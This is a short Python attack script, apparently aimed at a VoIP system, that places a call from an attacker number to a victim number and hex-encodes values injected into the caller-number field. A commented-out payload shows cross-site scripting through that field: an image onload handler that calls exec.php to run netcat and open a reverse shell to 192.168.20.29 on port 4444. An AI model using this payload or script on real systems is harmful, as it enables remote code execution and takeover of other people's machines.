from attack import Attack
from argparse import ArgumentParser


def encode(val) -> str:
    ret = ""
    for c in val:
        ret += "\\x%02x" % ord(c)
    return ret


parser = ArgumentParser()
parser.add_argument("--verbosity", type=int)
args = parser.parse_args()

# logo = "<img src='resources/images/kill.png' onload=\"q=new XMLHttpRequest();q.open('GET','exec.php?cmd=system nc 192.168.20.29 4444 -e /bin/sh',true);q.send();\">"

attack = Attack(
    attacker_number="1001",
    # attacker_number=encode("514353"),
    # attacker_number=encode(logo),
    # attacker_number="resources/images/kill.png",
    attacker_port=52058,
    victim_number="1002",
    victim_port=53086)

if args.verbosity:
    attack.register_victim()
    attack.initiate_call()
else:
    attack.close_sockets()
